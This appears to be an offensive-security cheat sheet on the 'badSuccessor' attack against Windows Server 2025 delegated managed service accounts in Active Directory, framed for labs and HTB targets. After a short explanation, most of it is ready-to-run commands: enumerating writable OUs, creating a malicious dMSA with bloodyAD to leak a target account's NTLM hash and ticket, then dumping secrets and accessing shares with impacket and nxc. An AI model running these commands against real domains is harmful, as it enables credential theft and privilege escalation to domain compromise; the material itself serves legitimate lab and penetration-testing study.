# dMSA / badSuccessor (CVE-2025-53779)

Delegated Managed Service Accounts (dMSA, Windows Server 2025) derive their
managed password from a **preceding account** linked via
`msDS-ManagedAccountPrecededByLink`.

Patched August 2025 but many labs/HTB targets remain unpatched.

## The attack (badSuccessor)
If you have **CreateChild + WriteProperty** on the OU holding dMSAs:
1. Create a new dMSA whose *preceded-by* link points at a high-value target.
2. S4U2self **as the dMSA**: the returned TGS is encrypted with the
   **preceding account's** NTLM -> the target's hash leaks.
3. Works even when the KDS managed-password root key is empty
   (`managedpw=none` -> use the S4U2self variant).

## Enumeration
```bash
# Check if the attack surface exists
nxc ldap <DC> -u <user> -p '<pass>' -M badsuccessor
# Find writable OUs
bloodyAD --host <DC> -d <dom> -u <user> -p '<pass>' get writable --otype OU
```

## Exploitation
```bash
# With password auth
bloodyAD --host <DC> -d <dom> -u <user> -p '<pass>' \
  add badSuccessor evilDMSA1 \
  -t "CN=<TARGET>,<target-DN>" --ou "OU=<dMSA-holder>,<DN>"

# With Kerberos (ccache)
bloodyAD --host <DC> -d <dom> -k ccache=<user>.ccache \
  add badSuccessor evilDMSA1 \
  -t "CN=<TARGET>,<target-DN>" --ou "OU=<dMSA-holder>,<DN>"
```
Output: `RC4: <TARGET_NTLM>` (the stolen hash) **and** `evilDMSA1_XX.ccache`
(dMSA's TGT, carries the target's group access for share/file access).

## Using the output
```bash
# Use the NTLM hash directly
nxc smb <DC> -u <target> -H <NTLM>
impacket-secretsdump '<dom>/<target>@<DC>' -hashes :<NTLM>

# Use the dMSA ccache for the target's access
export KRB5CCNAME=evilDMSA1_XX.ccache
impacket-smbclient -k -no-pass <DC>
```

## Gotchas
- dMSAs you create vanish on VM reset/reboot; re-create after resets.
- The ccache filename gets a random suffix (`evilDMSA1_XY.ccache`) -- capture
  from tool output, don't hardcode.
- Flag order: Kerberos auth flags (`-k ccache=...`) go before the subcommand.
- Verify `--host` vs `-H` vs `-i` against your bloodyAD version's `--help`.
